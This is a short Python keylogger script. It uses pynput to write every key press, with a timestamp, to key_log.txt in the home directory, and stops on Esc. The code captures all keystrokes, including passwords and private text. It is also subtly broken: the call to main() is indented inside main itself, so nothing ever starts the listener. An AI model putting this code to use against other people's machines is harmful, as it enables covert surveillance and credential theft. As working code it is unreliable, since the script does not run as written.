import os
import time
from pynput import keyboard
import traceback

# Define the log file path
log_dir = os.path.expanduser('~')
log_file = os.path.join(log_dir, "key_log.txt")

print(f"Logging to: {log_file}")  # Print the full path to verify it

def write_to_log_file(content):
    """Write the captured key content to the log file."""
    try:
        with open(log_file, "a") as f:
            f.write(content)
    except Exception as e:
        print(f"Error writing to log file: {e}")
        print(traceback.format_exc())

def on_press(key):
    """Callback function to handle key press events."""
    try:
        # Log regular keys with timestamp
        content = f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {key.char}\n"
        write_to_log_file(content)
    except AttributeError:
        # Handle special keys with timestamp
        content = f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {str(key)}\n"
        write_to_log_file(content)
    except Exception as e:
        print(traceback.format_exc())

def on_release(key):
    """Callback function to handle key release events."""
    if key == keyboard.Key.esc:
        # Stop listener
        return False

def main():
    """Main function to setup and start the key listener."""
    # Setup the listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    main()